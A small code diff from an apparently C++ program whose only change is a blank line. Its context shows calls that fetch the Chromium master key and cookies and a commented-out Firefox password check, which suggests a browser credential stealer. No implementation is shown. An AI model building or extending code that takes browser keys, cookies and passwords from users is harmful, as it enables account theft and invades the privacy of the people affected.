@@ -24,6 +24,7 @@ int main()
         ChromiumProcessor cProc1;
 
         cProc1.getMasterKey();
+
         cProc1.getChromiumCookies();
 /*
         if(experimental::filesystem::exists(firefox_pass_path))
